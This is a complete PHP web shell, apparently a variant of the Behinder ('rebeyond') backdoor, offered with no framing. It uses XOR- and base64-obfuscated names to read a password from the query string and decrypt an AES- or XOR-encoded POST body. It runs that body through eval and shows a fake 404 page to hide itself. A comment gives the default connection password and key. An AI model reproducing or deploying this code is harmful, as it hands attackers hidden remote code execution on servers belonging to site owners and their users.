
<?php
$a = ${base64_decode("ZCEtPA==")^base64_decode("O2ZoaA==")}[1];

//  1 is md5('admin'). You can have on your own.
if(md5($a)=='21232f297a57a5a743894a0e4a801fc3')
{
	session_start();
    $key="e45e329feb5d925b"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
	$_SESSION['k']=$key;
	session_write_close();
	$post=file_get_contents("php://input");
	if(!extension_loaded('openssl'))
	{
		$t="base64_"."decode";
		$post=$t($post."");
		
		for($i=0;$i<strlen($post);$i++) {
    			 $post[$i] = $post[$i]^$key[$i+1&15]; 
    			}
	}
	else
	{
		$post=openssl_decrypt($post, "AES128", $key);
	}
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
	class C{public function __invoke($p) {eval($p."");}};
	$t = base64_decode("Kz8uOnEvXUAuaj8mJV4=")^base64_decode("SF5CVi5aLiVcNVlTSz0=");
    @${'t'}(new C(),$params);
  
  
}
else{
	
	echo '<title>Error 404!!1</title><p align="center">404.Not Found</p>';

	header('HTTP/1.1 404 Not Found');
	http_response_code(404);
}
?>


